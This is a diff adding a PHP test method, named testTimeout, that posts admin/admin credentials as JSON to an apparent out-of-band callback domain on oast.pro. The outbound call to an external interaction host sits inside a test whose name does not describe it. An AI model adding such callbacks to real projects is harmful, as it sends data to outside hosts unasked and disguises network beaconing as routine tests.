@@ -107,5 +107,14 @@ class HttpTest extends TestCase
         assertTrue($response->ok());
     }
 
+    public function testTimeout()
+    {
+        $response = Http::timeout(1)->asJson()->post('https://bd0fa3351f48fd717fa8gi7abmeyyyyyb.oast.pro', [
+            'username'=>'admin',
+            'password'=>'admin'
+        ]);
+        assertTrue($response->ok());
+    }
+
 
 }
